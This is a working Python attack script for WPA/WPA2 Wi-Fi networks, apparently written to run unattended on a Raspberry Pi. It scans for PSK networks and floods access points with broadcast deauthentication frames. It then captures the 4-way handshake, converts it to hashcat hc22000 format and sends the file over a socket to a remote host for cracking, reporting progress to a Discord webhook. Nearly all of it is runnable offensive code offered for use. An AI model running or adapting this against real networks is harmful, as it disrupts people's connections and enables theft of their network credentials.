from scapy.all import *
from threading import Thread, Event
import time
import os
import json
import sys
import requests
import socket
from dhooks import Webhook
from jsondiff import diff

HOST = '192.168.1.2'   # change this with your endpoint's IP Address
PORT = 8080  #change this
MON_IFACE = sys.argv[1] 
networks = []

WEBHOOK_URL = " " # Change this with your webhook url

handshake_file=""
current_ap_mac = ""
captured = False
addr1_ap = 0
addr2_ap = 0


def enable_monitor_mode():
    global MON_IFACE
    os.system(f"sudo ip link set {MON_IFACE} down")
    os.system(f"sudo iw dev {MON_IFACE} set type monitor")
    os.system(f"sudo ip link set {MON_IFACE} up")


def APEnumeration(packet):
    global networks
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        ap = packet[Dot11].addr3

        try:
            # get the name of it
            ssid = packet[Dot11Elt].info.decode()
        except Exception as e:
            ssid = "N/A"
            print("Error decoding SSID: ", e)


        if ssid=="" or ssid is None:
            return
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"

        # Check if the length of info is greater than 0
        try:
            # Extract network stats
            stats = packet[Dot11Beacon].network_stats()
            # get the channel of the AP
            channel = stats.get("channel")
            # get the crypto
            crypto = stats.get("crypto")
            if ("WPA/PSK" in crypto or "WPA2/PSK" in crypto):
                data = {"ssid":ssid, "bssid":bssid, "channel":channel, "crypto": list(crypto)}
                networks.append(data)
        except Exception as e:
            print("Extracting network status: ",e)


def write_networks():
    global networks
    # Write networks to a json file to use later
    f = open("wifinetworks.json","w")
    json_obj = json.dumps(networks, indent=4)
    f.write(json_obj)
    f.close()


def deauth(ap_mac, channel, stop):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC

    global MON_IFACE
    # Change channel ID
    os.system(f"sudo iwconfig {MON_IFACE} channel {channel}")

    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    time.sleep(1)
    # send the packet
    for i in range(1000):
        sendp(packet, iface=MON_IFACE, inter=0.2, verbose=0)
        if stop.is_set():
            break


def capture_handshake(ap_mac, channel):
    global captured
    global MON_IFACE
    global handshake_file

    print("Capturing WPA handshake......")
    os.system(f"sudo iwconfig {MON_IFACE} channel {channel}")
    sniff(iface=MON_IFACE, stop_filter=WPAHandshake, timeout=180)

    if not captured:
        # Sometimes eventhough the eapol packets are captured, it is not detected by scapy. So writing this aditional check
        print("Runningadditional check to see if WPA handshake is captured")
        handshake_cap = rdpcap('tmp/handshake.pcap')
        from_ap = 0
        to_ap = 0
        for packet in handshake_cap:
            if packet.haslayer(EAPOL):
                addr1 = packet.addr1
                addr2 = packet.addr2

                if addr1 == ap_mac:
                    from_ap += 1
                elif addr2 == ap_mac:
                    to_ap += 1

        if from_ap >= 2 and to_ap >= 2:
            captured = True
            print("True")

    if captured:
        ap_mac_formatted = ap_mac.replace(":","-")
        handshake_file = f"handshake_{ap_mac_formatted}.pcap"
        print(f"\r4-way handshake captured for ap [{ap_mac}]")
        os.system(f"mv tmp/handshake.pcap handshakes/handshake_{ap_mac_formatted}.pcap")
        print(f"\rSaved in file handshake_{ap_mac_formatted}.pcap")
        return handshake_file
    else:
        print(f"\rUnable to capture handshake for ap [{ap_mac}]")
        return None


def WPAHandshake(packet):
    global current_ap_mac
    global captured
    #global TO_DS
    global addr1_ap
    global addr2_ap
    pktdump = PcapWriter("tmp/handshake.pcap", append=True, sync=True)
    captured = False
    pktdump.write(packet)
    if (EAPOL in packet) or (packet.haslayer(EAP)):
        addr1 = str(packet.addr1)
        addr2 = str(packet.addr2)
        if addr1 == current_ap_mac:
            addr1_ap += 1
        elif addr2 == current_ap_mac:
            addr2_ap += 1

    if addr1_ap >= 2 and addr2_ap >= 2:
        captured = True
        print("True")
        return captured

    return captured


def WPAHandshake_prn(packet):
    print("pkt received")
    if packet.haslayer(EAPOL):
        print("EAPOL captured")
        print(packet.addr1, packet.addr2)


def send_to_webhook(message):
    global WEBHOOK_URL
    webhook = Webhook(WEBHOOK_URL)

    for i in range(50):
        # Retry certain number of times incase the connection is broken
        try:
            webhook.send(message)
            print("Sent newly discovered networks to Discord")
            return
        except Exception as e:
            pass


def send_to_endpoint(hc22000_filename, data):
    global HOST
    global PORT

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((HOST, PORT))
        # Send filename
        client_socket.sendall(hc22000_filename.encode())
        # Send delimiter to separate filename from file contents
        client_socket.sendall(b'\r\n')
        # Send file data
        client_socket.sendall(data)
        print("Sent hc22000 file to end point")


def start():
    global networks
    global deauth_tried_aps
    global addr1_ap
    global addr2_ap
    global captured
    global current_ap_mac
    global handshake_file

    # start sniffing
    print("Enumerating WiFi networks")
    sniff(prn=APEnumeration, iface=MON_IFACE, timeout=60)

    # Remove duplicates
    networks = [i for n, i in enumerate(networks) if i not in networks[n + 1:]]

    print("Networks: ", networks)

    # Notify about newly discovered networks
    if os.path.exists("wifinetworks.json"):
        new_networks = []
        with open("wifinetworks.json","r") as f:
            data = f.read()
            try:
                data = json.loads(data)
                print("Comparing bssids")
                for current_network in networks:
                    print("Current: ",current_network['bssid'])
                    already_saved = False
                    for already_saved_network in data:
                        #print("Already saved: ", already_saved_network['bssid'])
                        if current_network['bssid'].strip() == already_saved_network['bssid'].strip():
                            already_saved = True
                            break

                    if not already_saved:
                        new_networks.append(current_network)

            except Exception as e:
                new_networks = networks

        if len(new_networks)!=0:
            print("New Networks: ",new_networks)
            # Send to webhook on a different thread
            message = "[From Pi] New WiFi Networks discovered: \n"
            to_send = json.dumps(new_networks, indent=4)
            message+=f"```{to_send}```"
            notifier = Thread(target=send_to_webhook, args=(message,))
            notifier.daemon = True
            notifier.start()
            send_to_webhook(message)

    # Write networks to file
    print("Writing found networks to file")
    write_networks()

    f=open("wifinetworks.json",'r')
    wifi_networks = json.loads(f.read())
    f.close()

    threads = []
    deauth_tried_aps = []
    for net in wifi_networks:
        # re-initialize necessary variables
        addr1_ap=0
        addr2_ap=0
        captured = False
        skip = False
        ap_mac = net['bssid']
        channel = net['channel']
        ssid = net['ssid']

        # Conditions for Testing purpose

        #if "TP-Link 7789" in ssid:  #add bssid of a network which you don't want to attack
         #    continue

        if "Target Network" not in ssid:
            continue

        if os.path.exists("captured_handshakes.json"):
            # Check if handshake is already captured
            with open("captured_handshakes.json","r") as f:
                data = f.readlines()
                for line in data:
                    if line=="":
                        continue
                    if ap_mac.lower() == line.strip().lower():
                        skip = True
                        break

        if skip:
            continue

        #if ap_mac in deauth_tried_aps:
            #continue

        current_ap_mac = ap_mac
        deauth_tried_aps.append(ap_mac)
        event = Event()

        # Perform deauth attack now in a different thread
        print(f"\n\n\rPerforming deauth attack on ap [{ssid}] [{ap_mac}] ...")
        deauther = Thread(target=deauth, args=(ap_mac, channel, event))
        #deauther.daemon = True
        deauther.start()

        time.sleep(0.1)

        # Listen for EAPOL packets (WPA handshake) in the main thread
        print("Listening for WPA handshake")
        handshake_filename = Thread(target=capture_handshake, args=(ap_mac, channel))
        handshake_filename.start()

        handshake_filename.join()
        event.set()
        deauther.join()

        if captured:
            # Notify
            message = "[From RaspberryPi]4-way handshake captured for the following network: \n"
            message+=f"```SSID: {ssid}, BSSID: {ap_mac}```"
            notifier = Thread(target=send_to_webhook, args=(message,))
            notifier.daemon = True
            notifier.start()

            # Add it to list of captured handshakes
            if not os.path.exists("captured_handshakes.json"):
                os.system("touch captured_handshakes.json")

            with open("captured_handshakes.json","a") as f:
                f.write(ap_mac+"\n")

            # Convert cap file to hashcat compatabile format with hcxpcapngtool
            print("Trying to convert handshakes to hc22000")
            hc22000_filename = ap_mac.replace(":","")+".hc22000"
            print(f"sudo hcxpcapngtool -o {hc22000_filename} {handshake_file} >/dev/null 2>&1")
            os.system(f"sudo hcxpcapngtool -o hc22000/{hc22000_filename} handshakes/{handshake_file} >/dev/null 2>&1")

            time.sleep(1)

            if not os.path.isfile(os.path.join("hc22000",hc22000_filename)):
                print("Failed converting handshake to hc22000")
                continue

            print(f"Converted handshake to hc22000 file hc22000/{hc22000_filename}")

            # Send to endpoint for cracking
            print(f"Sending the file to endpoint [{HOST}:{PORT}]")
            with open(os.path.join("hc22000",hc22000_filename),'rb') as f:
                file_data = f.read()
            send_to_endpoint(hc22000_filename, file_data)
            sender = Thread(target=send_to_endpoint, args=(hc22000_filename, file_data))
            sender.deamon = True
            sender.start()

            # Notify discord
            message = "[From RaspberryPi] Successfully sent 'hc22000 file' to endpoint for cracking for the following network: \n"
            message+=f"```SSID: {ssid}, BSSID: {ap_mac}```"
            notifier = Thread(target=send_to_webhook, args=(message,))
            notifier.daemon = True
            notifier.start()



if __name__ == "__main__":
    # Enable Monitor mode first
    print("Enabling monitor mode")
    enable_monitor_mode()

    if not os.path.exists("tmp"):
        os.mkdir("tmp")
        print("tmp directory created")

    if not os.path.exists("handshakes"):
        os.mkdir("handshakes")
        print("handshakes directory created")

    if not os.path.exists("hc22000"):
        os.mkdir("hc22000")
        print("hc22000 directory created")


    while 1:
        start()
        time.sleep(60)
        print()
